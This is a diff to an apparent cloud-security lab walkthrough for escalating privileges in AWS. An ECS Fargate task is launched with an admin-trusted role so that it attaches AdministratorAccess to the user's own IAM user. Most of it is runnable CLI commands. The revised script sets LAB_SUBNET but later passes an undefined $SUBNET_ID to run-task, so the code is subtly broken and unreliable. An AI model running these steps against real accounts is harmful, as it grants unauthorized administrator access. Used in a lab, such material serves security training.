@@ -22,6 +22,12 @@ First, confirm who you are and verify your permissions are in place:
 aws sts get-caller-identity
 ```
 
+Save your account ID — you will need it to build the role ARNs later:
+
+```bash
+ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
+```
+
 Check what the admin target role looks like — specifically its trust policy — to confirm it trusts ECS tasks:
 
 ```bash
@@ -30,10 +36,32 @@ aws iam get-role --role-name pl-prod-ecs-004-to-admin-target-role
 
 You will see `ecs-tasks.amazonaws.com` in the trust policy's `Principal` block. That means you can pass this role to an ECS task definition.
 
-Find a subnet in your default VPC (needed for the Fargate task's network configuration):
+Find a subnet in the `pathfinding` VPC (needed for the Fargate task's network configuration):
 
 ```bash
-aws ec2 describe-subnets --filters "Name=default-for-az,Values=true" --query "Subnets[0].SubnetId" --output text
+# Discover the custom network deployed by the lab environment.
+LAB_VPC=$(aws ec2 describe-vpcs \
+  --filters "Name=tag:Name,Values=pathfinding" "Name=is-default,Values=false" \
+  --query 'Vpcs[].VpcId' --output text) || exit 1
+
+if [[ ! "$LAB_VPC" =~ ^vpc-[0-9a-f]+$ ]]; then
+  echo "Expected exactly one custom pathfinding VPC. Check the account, region, and lab environment deployment." >&2
+  exit 1
+fi
+
+LAB_SUBNET=$(aws ec2 describe-subnets \
+  --filters "Name=vpc-id,Values=$LAB_VPC" \
+    "Name=tag:Name,Values=pathfinding Operational Subnet 1" \
+    "Name=map-public-ip-on-launch,Values=true" \
+  --query 'Subnets[].SubnetId' --output text) || exit 1
+
+if [[ ! "$LAB_SUBNET" =~ ^subnet-[0-9a-f]+$ ]]; then
+  echo "Expected exactly one public Pathfinding Operational Subnet 1 in $LAB_VPC." >&2
+  exit 1
+fi
+
+echo "Pathfinding VPC: $LAB_VPC"
+echo "Public subnet: $LAB_SUBNET"
 ```
 
 Save that subnet ID — you will need it when launching the task.
@@ -47,8 +75,8 @@ Register a task definition that uses the admin role as both the task role and th
 ```bash
 aws ecs register-task-definition \
   --family pl-prod-ecs-004-privesc \
-  --task-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-004-to-admin-target-role \
-  --execution-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-004-to-admin-target-role \
+  --task-role-arn arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-ecs-004-to-admin-target-role \
+  --execution-role-arn arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-ecs-004-to-admin-target-role \
   --network-mode awsvpc \
   --requires-compatibilities FARGATE \
   --cpu 256 --memory 512 \
@@ -60,11 +88,12 @@ The `--task-role-arn` is what matters for the privilege escalation: the running 
 ### Step 2: Launch the task on Fargate
 
 ```bash
-aws ecs run-task \
+TASK_ARN=$(aws ecs run-task \
   --cluster pl-prod-ecs-004-cluster \
   --task-definition pl-prod-ecs-004-privesc \
   --launch-type FARGATE \
-  --network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],assignPublicIp=ENABLED}"
+  --network-configuration "awsvpcConfiguration={subnets=[$SUBNET_ID],assignPublicIp=ENABLED}" \
+  --query 'tasks[0].taskArn' --output text)
 ```
 
 The task will provision, start, execute the AWS CLI command, and stop — all within a few seconds. The `AdministratorAccess` policy attachment is permanent on your IAM user even after the task exits.
@@ -74,7 +103,7 @@ The task will provision, start, execute the AWS CLI command, and stop — all wi
 ```bash
 aws ecs describe-tasks \
   --cluster pl-prod-ecs-004-cluster \
-  --tasks <task-arn>
+  --tasks "$TASK_ARN"
 ```
 
 Wait for the task to reach `STOPPED` status with an exit code of `0` on the container.
